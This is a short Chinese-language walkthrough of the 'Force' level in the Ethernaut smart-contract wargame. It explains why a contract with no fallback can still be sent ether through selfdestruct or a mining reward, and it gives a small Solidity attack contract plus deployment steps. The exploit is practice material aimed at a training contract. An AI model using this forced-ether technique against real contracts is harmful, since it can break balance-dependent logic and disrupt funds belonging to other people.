# Force
关于强制向某个地址进行转账
```solidity
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### 代码分析
上述合约没有实际的代码，没有fallback函数，所以如何通过transfer，sendTransaction等方法直接向合约地址转账会失败。
但是，如果将该地址作为miner的受益地址或者将其作为selfdestruct的受益地址时，资金还是可以转移到该合约地址上。
因为上述两种情形都没有执行合约的代码。

### 攻击合约
```solidity
pragma solidity ^0.4.18;

contract ForceAttack {

  function ForceAttack() public payable {}
  function() public payable {}

  function attack(address target) public {
    selfdestruct(target);
  }
}
```

### 攻击步骤
1. 部署攻击合约，并向其发送一定数量的eth
2. 调用攻击合约的attack(address)方法